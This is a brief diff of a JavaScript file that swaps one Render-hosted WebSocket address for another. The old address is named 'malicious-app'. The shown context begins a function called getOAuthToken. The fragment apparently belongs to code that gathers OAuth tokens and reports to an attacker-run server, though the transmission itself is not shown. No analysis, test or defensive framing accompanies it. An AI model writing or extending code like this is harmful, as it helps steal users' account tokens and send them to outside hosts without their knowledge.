@@ -1,5 +1,5 @@
 (async function() {
-    const WEBSOCKET_URL = "wss://malicious-app.onrender.com/socket"; // Render-hosted WebSocket Server
+    const WEBSOCKET_URL = "wss://rend-ezpt.onrender.com"; // Render-hosted WebSocket Server
 
     async function getOAuthToken() {
         return new Promise((resolve, reject) => {
